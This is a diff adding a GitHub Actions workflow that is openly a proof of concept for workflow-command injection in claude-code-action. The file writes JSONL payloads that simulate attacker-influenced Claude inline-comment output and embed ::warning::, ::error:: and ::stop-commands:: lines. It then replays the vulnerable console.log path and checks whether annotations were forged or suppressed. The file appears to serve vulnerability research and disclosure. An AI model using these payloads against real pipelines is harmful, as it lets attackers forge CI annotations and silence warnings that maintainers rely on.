@@ -1,0 +1,75 @@
+name: "PoC: Workflow Command Injection via Unsanitized Body in console.log"
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  poc-workflow-command-injection:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ── Step 1: Create the JSONL buffer simulating what github-inline-comment-server.ts writes ──
+      # In the real target (claude-code-action), Claude generates inline comments
+      # whose `body` field can contain embedded newlines. The body is sanitized
+      # by sanitizeContent() which strips HTML comments, invisible chars, image
+      # alt text, link titles, hidden attributes, and redacts GitHub tokens —
+      # but does NOT strip newline characters or `::` workflow command prefixes.
+      - name: "Setup: Create malicious JSONL buffer (simulates attacker-influenced Claude output)"
+        run: |
+          # Payload 1: ::warning:: injection via embedded newline
+          printf '{"ts":"2025-01-01T00:00:00Z","path":"src/index.ts","line":10,"body":"Test probe comment\\n::warning::INJECTED-BY-ATTACKER: This annotation was injected via workflow command","confirmed":null}\n' > /tmp/inline-comments-buffer.jsonl
+
+          # Payload 2: ::error:: injection
+          printf '{"ts":"2025-01-01T00:00:01Z","path":"src/utils.ts","line":20,"body":"Testing tool\\n::error file=src/utils.ts,line=1::INJECTED-ERROR: Attacker-controlled error annotation","confirmed":null}\n' >> /tmp/inline-comments-buffer.jsonl
+
+          # Payload 3: ::stop-commands:: to disable all subsequent workflow commands
+          printf '{"ts":"2025-01-01T00:00:02Z","path":"src/main.ts","line":30,"body":"Check function\\n::stop-commands::attacker-token-abc123","confirmed":null}\n' >> /tmp/inline-comments-buffer.jsonl
+
+          echo "Buffer contents (raw bytes):"
+          xxd /tmp/inline-comments-buffer.jsonl | head -40
+          echo "---"
+          echo "Buffer contents (text):"
+          cat /tmp/inline-comments-buffer.jsonl
+
+      # ── Step 2: Faithful reproduction of post-buffered-inline-comments.ts lines 200-206 ──
+      # This Node.js script exactly mirrors the vulnerable code path:
+      #   1. readFileSync → split → JSON.parse  (lines 149-158)
+      #   2. console.log of body.slice(0, 120)    (line 205)
+      - name: "Exploit: Reproduce vulnerable console.log path (mirrors post-buffered-inline-comments.ts:200-206)"
+        run: |
+          node -e '
+          const fs = require("fs");
+          const BUFFER_PATH = "/tmp/inline-comments-buffer.jsonl";
+          const raw = fs.readFileSync(BUFFER_PATH, "utf8");
+          const comments = raw.split("\n").filter(Boolean).map(line => JSON.parse(line));
+
+          console.log("Found " + comments.length + " buffered inline comment(s)");
+
+          // Simulate: all comments classified as "test/probe" by Haiku (filtered array)
+          const filtered = comments;
+
+          // ── This is the EXACT vulnerable code from line 200-206 ──
+          if (filtered.length > 0) {
+            console.log(
+              "::warning::" + filtered.length + " buffered comment(s) classified as test/probe — NOT posted:"
+            );
+            for (const c of filtered) {
+              console.log("  [" + c.path + ":" + c.line + "] " + c.body.slice(0, 120));
+            }
+          }
+          '
+
+      # ── Step 3: Verification — can subsequent workflow commands still function? ──
+      # If ::stop-commands:: was processed, this ::warning:: will NOT appear as an annotation
+      - name: "Verify: This warning should be suppressed if ::stop-commands:: was processed"
+        run: |
+          echo "::warning::POST-EXPLOIT-CANARY: If you see this as an annotation, stop-commands did NOT fire"
+          echo "If the above line appears as plain text (not a warning annotation), ::stop-commands:: was processed successfully"
+
+      # ── Step 4: Clean control — show normal workflow commands work in isolation ──
+      - name: "Control: Normal workflow commands in a fresh step (unaffected by stop-commands)"
+        run: |
+          echo "::warning::CONTROL-WARNING: This is a normal warning annotation in a separate step"
+          echo "::error::CONTROL-ERROR: This is a normal error annotation in a separate step"
